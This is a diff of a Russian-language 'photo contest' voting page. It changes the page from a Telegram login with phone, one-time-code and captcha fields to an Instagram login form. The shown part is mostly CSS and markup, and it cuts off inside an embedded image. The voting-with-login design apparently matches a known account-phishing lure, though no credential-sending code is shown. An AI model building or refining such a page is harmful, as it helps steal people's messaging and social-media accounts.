@@ -3,18 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Голосование за фото</title>
+    <title>Фотоконкурс | Голосование</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: 'Segoe UI', 'Arial', sans-serif;
+        :root {
+            --primary: #FF6B6B;
+            --secondary: #4ECDC4;
+            --dark: #1A1A2E;
+            --light: #F1F1F1;
+            --accent: #FFD166;
+            --success: #06D6A0;
+            --error: #EF476F;
         }
-        
-        body {
+
+        * {
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--dark), #16213E);
             min-height: 100vh;
+            color: var(--light);
+            line-height: 1.6;
         }
 
         .container {
@@ -23,655 +36,908 @@
             padding: 20px;
         }
 
-        header {
-            background: linear-gradient(45deg, #2196F3, #00BCD4);
-            color: white;
+        .header {
             text-align: center;
-            padding: 40px 0;
-            margin-bottom: 50px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            transform: translateY(0);
-            transition: transform 0.3s ease;
+            margin-bottom: 40px;
+            padding: 30px 0;
+            position: relative;
+            overflow: hidden;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
 
-        header:hover {
-            transform: translateY(-5px);
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
         }
 
-        h1 {
-            margin: 0;
-            font-size: 2.5em;
-            font-weight: 700;
+        .header h1 {
+            font-size: 2.8em;
+            margin-bottom: 15px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
         }
 
-        .voting-area {
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .photo-container {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
             gap: 30px;
-            margin-bottom: 40px;
+            margin-bottom: 50px;
         }
 
         .photo-card {
-            background: white;
+            background: rgba(255, 255, 255, 0.08);
             border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
+            padding: 20px;
             transition: all 0.3s ease;
-            transform: translateY(0);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
         }
 
         .photo-card:hover {
             transform: translateY(-10px);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.12);
         }
 
-        .photo-container {
-            height: 300px;
-            position: relative;
-            overflow: hidden;
-            background-color: #f8f9fa;
-        }
-
-        .photo-container img {
+        .photo-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
             width: 100%;
-            height: 570px;
-            object-fit: cover;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transform: scaleX(0);
+            transform-origin: left;
             transition: transform 0.3s ease;
         }
 
-        .photo-card:hover .photo-container img {
-            transform: scale(1.05);
+        .photo-card:hover::after {
+            transform: scaleX(1);
+        }
+
+        .photo-placeholder {
+            background: linear-gradient(45deg, #2a2a2a, #1a1a1a);
+            height: 350px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .photo-placeholder img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .photo-placeholder::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 0%,
+                rgba(255, 255, 255, 0.1) 50%,
+                rgba(255, 255, 255, 0) 100%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
+        }
+
+        .photo-number {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+            z-index: 2;
+        }
+
+        .photo-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .photo-title {
+            font-size: 1.3em;
+            font-weight: 600;
+        }
+
+        .vote-count {
+            font-size: 1.1em;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .vote-count i {
+            margin-right: 8px;
+            color: var(--primary);
         }
 
         .vote-btn {
-            background: linear-gradient(45deg, #2196F3, #00BCD4);
-            color: white;
+            background: linear-gradient(45deg, var(--primary), #FF8E8E);
             border: none;
-            padding: 15px 35px;
-            font-size: 16px;
+            padding: 12px 25px;
             border-radius: 30px;
+            color: white;
+            font-weight: bold;
             cursor: pointer;
+            width: 100%;
             transition: all 0.3s ease;
-            margin: 20px 0;
-            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            box-shadow: 0 4px 15px rgba(239, 71, 111, 0.4);
+        }
+
+        .vote-btn i {
+            margin-right: 10px;
         }
 
         .vote-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(33,150,243,0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(239, 71, 111, 0.6);
         }
 
-        .vote-btn:disabled {
-            background: #e0e0e0;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .vote-btn:active {
+            transform: translateY(1px);
         }
 
-        .auth-modal {
+        .login-form {
+            background: rgba(26, 26, 46, 0.9);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 450px;
+            margin: 0 auto;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-form::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+
+        .login-form h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 1.8em;
+            color: var(--light);
+            position: relative;
+        }
+
+        .login-form h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            border-radius: 3px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            color: var(--light);
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.15);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(239, 71, 111, 0.2);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, var(--success), #06b890);
+            border: none;
+            padding: 15px 25px;
+            border-radius: 30px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            font-size: 1.1em;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 10px;
+            box-shadow: 0 4px 15px rgba(6, 214, 160, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .submit-btn i {
+            margin-right: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(6, 214, 160, 0.6);
+        }
+
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+
+        .instagram-login {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .instagram-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(64, 93, 230, 0.4);
+            margin-top: 15px;
+        }
+
+        .instagram-btn i {
+            margin-right: 10px;
+            font-size: 1.2em;
+        }
+
+        .instagram-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(64, 93, 230, 0.6);
+        }
+
+        .modal {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0,0,0,0.8);
-            z-index: 100;
+            background: rgba(0,0,0,0.8);
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
         }
 
-        .modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            position: relative;
-            animation: modalSlideIn 0.4s ease;
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                transform: translateY(-100px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .telegram-btn {
-            background: linear-gradient(45deg, #2196F3, #00BCD4);
-            color: white;
-            border: none;
-            padding: 15px 35px;
-            font-size: 18px;
-            border-radius: 30px;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-            transition: all 0.3s ease;
-        }
-
-        .telegram-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(33,150,243,0.4);
+        .modal.active {
+            display: flex;
+            opacity: 1;
         }
 
         .close-modal {
             position: absolute;
-            top: 15px;
+            top: 20px;
             right: 20px;
-            font-size: 28px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1.8em;
             cursor: pointer;
-            color: #666;
-            transition: all 0.3s ease;
+            transition: color 0.3s ease;
         }
 
         .close-modal:hover {
-            color: #2196F3;
-            transform: rotate(90deg);
+            color: var(--primary);
         }
 
         .loading {
-            display: inline-block;
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255,255,255,.3);
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
             border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+            border-top: 4px solid var(--accent);
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
         }
 
         @keyframes spin {
-            to { transform: rotate(720deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .phone-input, .otp-input, .captcha-input {
-            width: 100%;
+        .loading p {
+            margin-top: 10px;
+            font-size: 1.1em;
+        }
+
+        .debug-info {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
             padding: 15px;
-            font-size: 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 0.9em;
+            max-width: 300px;
+            display: none;
+            z-index: 100;
+            border-left: 4px solid var(--accent);
         }
 
-        .phone-input:focus, .otp-input:focus, .captcha-input:focus {
-            border-color: #2196F3;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(33,150,243,0.2);
-        }
-
-        .captcha-container {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
+        .debug-toggle {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--dark);
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-        }
-
-        .captcha-code {
-            font-size: 28px;
-            font-weight: bold;
-            letter-spacing: 8px;
-            color: #2196F3;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
-
-        .refresh-captcha {
-            background: none;
-            border: none;
-            font-size: 24px;
+            justify-content: center;
             cursor: pointer;
-            color: #2196F3;
-            transition: transform 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            z-index: 101;
+            border: 2px solid var(--accent);
         }
 
-        .refresh-captcha:hover {
-            transform: rotate(180deg);
+        .debug-toggle i {
+            font-size: 1.5em;
         }
 
-        .result-message {
-            display: none;
-            background: linear-gradient(45deg, #4CAF50, #8BC34A);
+        .debug-info.active {
+            display: block;
+        }
+
+        .debug-entry {
+            margin-bottom: 8px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .debug-entry:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .debug-timestamp {
+            color: var(--accent);
+            font-size: 0.8em;
+            margin-right: 5px;
+        }
+
+        .debug-message {
             color: white;
-            padding: 20px;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            animation: slideDown 0.4s ease;
         }
 
-        @keyframes slideDown {
-            from {
-                transform: translateY(-20px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
+        .success-message {
+            background: rgba(6, 214, 160, 0.2);
+            border: 1px solid var(--success);
+            color: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
         }
 
-        .counter {
-            font-size: 24px;
-            font-weight: bold;
-            color: #2196F3;
+        .error-message {
+            background: rgba(239, 71, 111, 0.2);
+            border: 1px solid var(--error);
+            color: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .photo-description {
             margin: 15px 0;
-            transition: all 0.3s ease;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.95em;
+            line-height: 1.5;
         }
 
-        .timer {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #666;
+        .instagram-input-group {
+            display: flex;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding-left: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .small {
-            font-size: 14px;
-            color: #666;
-            margin-top: 15px;
+        .instagram-prefix {
+            color: rgba(255, 255, 255, 0.7);
+            margin-right: 5px;
         }
 
         @media (max-width: 768px) {
-            .container {
-                padding: 15px;
+            .photo-container {
+                grid-template-columns: 1fr;
             }
-            
-            header {
-                padding: 30px 0;
-                margin-bottom: 30px;
-            }
-            
-            h1 {
+
+            .header h1 {
                 font-size: 2em;
             }
-            
+
             .photo-card {
-                min-width: 100%;
-            }
-            
-            .modal-content {
-                padding: 30px 20px;
-            }
-            
-            .telegram-btn {
                 width: 100%;
+            }
+
+            .login-form {
+                padding: 30px 20px;
+                width: 90%;
             }
         }
 
         @media (max-width: 480px) {
-            .photo-container {
+            .header {
+                padding: 20px 0;
+            }
+
+            .header h1 {
+                font-size: 1.8em;
+            }
+
+            .photo-placeholder {
                 height: 250px;
             }
-            
-            .vote-btn {
-                padding: 12px 25px;
-                font-size: 14px;
-            }
-            
-            .captcha-code {
-                font-size: 24px;
-                letter-spacing: 5px;
+
+            .vote-btn, .submit-btn {
+                padding: 12px 20px;
+                font-size: 1em;
             }
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="container">
-            <h1>Голосование за лучшее фото</h1>
-            <p>Выберите одно из двух представленных изображений</p>
-        </div>
-    </header>
-
     <div class="container">
-        <div id="resultMessage" class="result-message">
-            Спасибо за ваш голос! Он был успешно учтен.
-        </div>
-        
-        <div class="voting-area">
-            <div class="photo-card">
-                <div class="photo-container">
-                    <img src="https://maxtv.co.il/wp-content/uploads/2022/06/160620221655337604.jpeg" alt="Фото 1">
+        <header class="header animation">
+            <h1>Фотоконкурс 2025</h1>
+            <p>Проголосуйте за лучшую фотографию и получите шанс выиграть призы!</p>
+        </header>
+
+        <div class="photo-container">
+            <div class="photo-card animation">
+                <div class="photo-number">1</div>
+                <div class="photo-placeholder">
+                    <img src="data:image/jpeg;base64,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